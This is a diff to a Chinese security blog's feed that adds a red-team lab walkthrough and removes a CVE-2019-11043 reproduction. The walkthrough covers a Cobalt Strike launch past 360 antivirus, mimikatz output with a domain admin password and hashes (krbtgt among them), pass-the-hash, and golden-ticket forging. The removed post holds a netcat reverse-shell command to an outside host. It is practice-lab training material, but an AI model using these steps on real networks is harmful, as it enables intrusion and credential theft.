+<a href="KB958488">02</a>: fe80::189d:8528:d537:fa88</p>
+<p>查看进程，发现存在360的主动防御</p>
+<pre><code class="language-shell">C:/Oracle/Middleware/user_projects/domains/base_domain/ &gt;tasklist/svc
+
+映像名称                       PID 服务                                        
+========================= ======== ============================================
+System Idle Process              0 暂缺                                        
+System                           4 暂缺                                        
+smss.exe                       256 暂缺                                        
+csrss.exe                      344 暂缺                                        
+wininit.exe                    404 暂缺                                        
+services.exe                   500 暂缺                                        
+lsass.exe                      508 Netlogon, SamSs                             
+lsm.exe                        516 暂缺                                        
+svchost.exe                    604 DcomLaunch, PlugPlay, Power                 
+vmacthlp.exe                   664 VMware Physical Disk Helper Service         
+svchost.exe                    708 RpcEptMapper, RpcSs                         
+svchost.exe                    796 Dhcp, eventlog, lmhosts                     
+svchost.exe                    848 AeLookupSvc, Appinfo, CertPropSvc, gpsvc,   
+                                   IKEEXT, iphlpsvc, LanmanServer, ProfSvc,    
+                                   Schedule, SENS, SessionEnv,                 
+                                   ShellHWDetection, Winmgmt, wuauserv         
+svchost.exe                    912 EventSystem, netprofm, nsi, sppuinotify,    
+                                   W32Time                                     
+svchost.exe                    952 Netman, TrkWks, UmRdpService, UxSms         
+ZhuDongFangYu.exe              988 ZhuDongFangYu                               
+svchost.exe                    124 CryptSvc, Dnscache, LanmanWorkstation,      
+                                   NlaSvc                                      
+svchost.exe                    264 BFE, DPS, MpsSvc                            
+spoolsv.exe                   1180 Spooler                                     
+svchost.exe                   1212 AppHostSvc                                  
+sqlservr.exe                  1400 MSSQL$SQLEXPRESS                            
+SMSvcHost.exe                 1480 NetPipeActivator, NetTcpActivator,          
+                                   NetTcpPortSharing                           
+sqlwriter.exe                 1900 SQLWriter                                   
+VGAuthService.exe             1948 VGAuthService                               
+vmtoolsd.exe                  1988 VMTools                                     
+svchost.exe                   2028 W3SVC, WAS                                  
+fdlauncher.exe                1760 MSSQLFDLauncher$SQLEXPRESS                  
+svchost.exe                   1740 TermService                                 
+svchost.exe                   1876 PolicyAgent                                 
+fdhost.exe                     836 暂缺                                        
+conhost.exe                    888 暂缺                                        
+dllhost.exe                   2244 COMSysApp                                   
+msdtc.exe                     2420 MSDTC                                       
+WmiPrvSE.exe                  2620 暂缺                                        
+sppsvc.exe                    2124 sppsvc                                      
+csrss.exe                      968 暂缺                                        
+winlogon.exe                  2472 暂缺                                        
+taskhost.exe                  3048 暂缺                                        
+dwm.exe                       1608 暂缺                                        
+explorer.exe                  1712 暂缺                                        
+vmtoolsd.exe                  3008 暂缺                                        
+cmd.exe                       3060 暂缺                                        
+conhost.exe                   2924 暂缺                                        
+mmc.exe                       2580 暂缺                                        
+TrustedInstaller.exe          1476 TrustedInstaller                            
+cmd.exe                       2428 暂缺                                        
+conhost.exe                   2264 暂缺                                        
+java.exe                       496 暂缺                                        
+cmd.exe                        488 暂缺                                        
+conhost.exe                   2692 暂缺                                        
+sc.exe                        2104 暂缺                                        
+cmd.exe                       1796 暂缺                                        
+conhost.exe                   3020 暂缺                                        
+sc.exe                        3004 暂缺                                        
+cmd.exe                       2600 暂缺                                        
+conhost.exe                   2788 暂缺                                        
+sc.exe                        2524 暂缺                                        
+cmd.exe                        292 暂缺                                        
+conhost.exe                    336 暂缺                                        
+sc.exe                         356 暂缺                                        
+cmd.exe                       1468 暂缺                                        
+conhost.exe                   1824 暂缺                                        
+tasklist.exe                  2164 暂缺 
+</code></pre>
+<p>尝试上线cs</p>
+<p>存在360，所以需要免杀的马，这里我使用我写的shellcodeloader，完美过360.</p>
+<figure data-type="image" tabindex="5"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/%E9%9D%B6%E5%9C%BA/hongri/5.png" alt="1632211789400" loading="lazy"></figure>
+<h1 id="0x05-内网信息收集以及横向">0x05 内网信息收集以及横向</h1>
+<p>密码抓取，发现域控DC登录过。</p>
+<pre><code class="language-shell">Authentication Id : 0 ; 9556781 (00000000:0091d32d)
+Session           : CachedInteractive from 2
+User Name         : Administrator
+Domain            : DE1AY
+Logon Server      : DC
+Logon Time        : 2021/9/21 15:40:41
+SID               : S-1-5-21-2756371121-2868759905-3853650604-500
+	msv :	
+	 [00000003] Primary
+	 * Username : Administrator
+	 * Domain   : DE1AY
+	 * LM       : f67ce55ac831223dc187b8085fe1d9df
+	 * NTLM     : 161cff084477fe596a5db81874498a24
+	 * SHA1     : d669f3bccf14bf77d64667ec65aae32d2d10039d
+	tspkg :	
+	 * Username : Administrator
+	 * Domain   : DE1AY
+	 * Password : 1qaz@WSX
+	wdigest :	
+	 * Username : Administrator
+	 * Domain   : DE1AY
+	 * Password : 1qaz@WSX
+	kerberos :	
+	 * Username : Administrator
+	 * Domain   : de1ay.com
+	 * Password : 1qaz@WSX
+	ssp :	
+	credman :
+</code></pre>
+<p>使用net view以及hash传递上线。</p>
+<figure data-type="image" tabindex="6"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/%E9%9D%B6%E5%9C%BA/hongri/6.png" alt="1632216003567" loading="lazy"></figure>
+<h1 id="0x06-域权限维持">0x06 域权限维持</h1>
+<p>域控密码抓取</p>
+<pre><code class="language-shell">Authentication Id : 0 ; 226447 (00000000:0003748f)
+Session           : Interactive from 1
+User Name         : de1ay
+Domain            : DE1AY
+Logon Server      : DC
+Logon Time        : 2021/9/20 17:12:55
+SID               : S-1-5-21-2756371121-2868759905-3853650604-1001
+	msv :	
+	 [00000003] Primary
+	 * Username : de1ay
+	 * Domain   : DE1AY
+	 * NTLM     : 161cff084477fe596a5db81874498a24
+	 * SHA1     : d669f3bccf14bf77d64667ec65aae32d2d10039d
+	 [00010000] CredentialKeys
+	 * NTLM     : 161cff084477fe596a5db81874498a24
+	 * SHA1     : d669f3bccf14bf77d64667ec65aae32d2d10039d
+	tspkg :	
+	wdigest :	
+	 * Username : de1ay
+	 * Domain   : DE1AY
+	 * Password : (null)
+	kerberos :	
+	 * Username : de1ay
+	 * Domain   : DE1AY.COM
+	 * Password : (null)
+	ssp :	KO
+	credman :
+	
+beacon&gt; hashdump
+[*] Tasked beacon to dump hashes
+[+] host called home, sent: 82501 bytes
+[+] received password hashes:
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:161cff084477fe596a5db81874498a24:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:82dfc71b72a11ef37d663047bc2088fb:::
+de1ay:1001:aad3b435b51404eeaad3b435b51404ee:161cff084477fe596a5db81874498a24:::
+mssql:2103:aad3b435b51404eeaad3b435b51404ee:161cff084477fe596a5db81874498a24:::
+DC$:1002:aad3b435b51404eeaad3b435b51404ee:191fbaef80e1b2641b0e79f03c634ce4:::
+PC$:1105:aad3b435b51404eeaad3b435b51404ee:288707796e6021d379ae70f0acd53e88:::
+WEB$:1603:aad3b435b51404eeaad3b435b51404ee:6aeba9f5141c4f8d47a1c26173aecb26:::
+</code></pre>
+<p>​</p>
+<p>伪造黄金票据</p>
+<p>条件：</p>
+<p>1.域名称</p>
+<p>2.域的SID值</p>
+<p>3.域的KRBTGT账户NTLM密码哈希</p>
+<p>4.伪造用户名</p>
+<p>具体操作参考：https://blog.csdn.net/qq_32731075/article/details/118193887</p>
+<figure data-type="image" tabindex="7"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/%E9%9D%B6%E5%9C%BA/hongri/7.png" alt="1632220218868" loading="lazy"></figure>
+<figure data-type="image" tabindex="8"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/%E9%9D%B6%E5%9C%BA/hongri/8.png" alt="1632220391203" loading="lazy"></figure>
+<!-- more -->
+]]></content>
+    </entry>
     <entry>
         <title type="html"><![CDATA[tomcat漏洞总结]]></title>
         <id>https://www.yyxyy.xyz/post/tomcat-lou-dong-zong-jie/</id>
@@ -651,67 +1403,6 @@ docker-compose down        //要进入另一个漏洞靶场，则先要结束掉
 <p>这一步拿到session我们也可以直接在浏览器添加cookie，也能完成。</p>
 <figure data-type="image" tabindex="4"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/vulhub/CVE-2018-8715/4.png" alt="" loading="lazy"></figure>
 <p>[+]具体参考链接<a href="https://www.freebuf.com/column/221660.html">https://www.freebuf.com/column/221660.html</a></p>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[CVE-2019-11043漏洞复现&&反弹shell]]></title>
-        <id>https://www.yyxyy.xyz/post/cve-2019-11043-lou-dong-fu-xian-andfan-dan-shell/</id>
-        <link href="https://www.yyxyy.xyz/post/cve-2019-11043-lou-dong-fu-xian-andfan-dan-shell/">
-        </link>
-        <updated>2021-06-06T03:56:44.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="cve-2019-11043漏洞复现反弹shell">CVE-2019-11043漏洞复现&amp;&amp;反弹shell</h3>
-<h4 id="1漏洞介绍">1.漏洞介绍</h4>
-<p>nginx + php-fpm 配置不当，当nginx配置文件中有<code>fastcgi_split_path_info</code>，却没有if(!-<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>d</mi><mi>o</mi><mi>c</mi><mi>u</mi><mi>m</mi><mi>e</mi><mi>n</mi><msub><mi>t</mi><mi>r</mi></msub><mi>o</mi><mi>o</mi><mi>t</mi></mrow><annotation encoding="application/x-tex">document_root</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord mathdefault">d</span><span class="mord mathdefault">o</span><span class="mord mathdefault">c</span><span class="mord mathdefault">u</span><span class="mord mathdefault">m</span><span class="mord mathdefault">e</span><span class="mord mathdefault">n</span><span class="mord"><span class="mord mathdefault">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.02778em;">r</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault">o</span><span class="mord mathdefault">o</span><span class="mord mathdefault">t</span></span></span></span>fastcgi_script_name){return 404;}`的时候就会导致远程代码执行。</p>
-<p>像服务器url发送%0a时，服务器返回异常。</p>
-<p>该漏洞需要在nginx.conf中进行特定配置才能触发。具体配置如下：</p>
-<pre><code class="language-nginx">location ~ [^/]\.php(/|$) {
- ...
- fastcgi_split_path_info ^(.+?\.php)(/.*)$;
- fastcgi_param PATH_INFO $fastcgi_path_info;
- fastcgi_pass   php:9000;
- ...
-}
-</code></pre>
-<p>攻击者可以使用换行符（％0a）来破坏<code>fastcgi_split_path_info</code>指令中的Regexp。 Regexp被损坏导致PATH_INFO为空，从而触发该漏洞。</p>
-<p>fastcgi_split_path_info：<a href="https://segmentfault.com/a/1190000002667095">https://segmentfault.com/a/1190000002667095</a></p>
-<h4 id="2漏洞复现">2.漏洞复现</h4>
-<p>环境使用的vulhub</p>
-<p>具体参考：<a href="https://github.com/vulhub/vulhub/blob/master/php/CVE-2019-11043/README.zh-cn.md">https://github.com/vulhub/vulhub/blob/master/php/CVE-2019-11043/README.zh-cn.md</a></p>
-<p>环境需要 docker、golang</p>
-<pre><code class="language-shell">sudo apt-get install docker docker-compose
-sudo apt install golang
-</code></pre>
-<p>环境搭建完成打开127.0.0.1:8080就能访问</p>
-<figure data-type="image" tabindex="1"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/vulhub/CVE-2019-11043/1.png" alt="" loading="lazy"></figure>
-<p>安装漏洞利用工具</p>
-<pre><code class="language-shell">git clone https://github.com/neex/phuip-fpizdam.git
-cd phuip-fpizdam
-go get -v &amp;&amp; go build
-</code></pre>
-<p>漏洞利用</p>
-<figure data-type="image" tabindex="2"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/vulhub/CVE-2019-11043/2.png" alt="" loading="lazy"></figure>
-<figure data-type="image" tabindex="3"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/vulhub/CVE-2019-11043/3.png" alt="" loading="lazy"></figure>
-<figure data-type="image" tabindex="4"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/vulhub/CVE-2019-11043/4.png" alt="" loading="lazy"></figure>
-<figure data-type="image" tabindex="5"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/vulhub/CVE-2019-11043/5.png" alt="" loading="lazy"></figure>
-<h5 id="反弹shell">反弹shell</h5>
-<p>想的是用nc反弹shell，然后发现docker环境里面没有nc，只好自己安装nc了</p>
-<figure data-type="image" tabindex="6"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/vulhub/CVE-2019-11043/6.png" alt="" loading="lazy"></figure>
-<pre><code class="language-powershell">apt update
-apt-get install netcat
-</code></pre>
-<figure data-type="image" tabindex="7"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/vulhub/CVE-2019-11043/7.png" alt="" loading="lazy"></figure>
-<p>nc安装完毕</p>
-<pre><code class="language-shell">#现在外网服务器上面监听 
-nc -lvp 7777
-
-#再用 nc -e /bin/bash x.x.x.x 7777 反弹shell 
-</code></pre>
-<figure data-type="image" tabindex="8"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/vulhub/CVE-2019-11043/8.png" alt="" loading="lazy"></figure>
-<h5 id="参考链接">参考链接</h5>
-<p><a href="https://github.com/vulhub/vulhub/blob/master/php/CVE-2019-11043/README.zh-cn.md">https://github.com/vulhub/vulhub/blob/master/php/CVE-2019-11043/README.zh-cn.md</a></p>
-<p><a href="https://github.com/neex/phuip-fpizdam/issues/1">https://github.com/neex/phuip-fpizdam/issues/1</a></p>
-<p><a href="https://bugs.php.net/bug.php?id=78599">https://bugs.php.net/bug.php?id=78599</a></p>
-<p><a href="http://blog.leanote.com/post/snowming/9da184ef24bd">http://blog.leanote.com/post/snowming/9da184ef24bd</a></p>
 ]]></content>
     </entry>
 </feed>
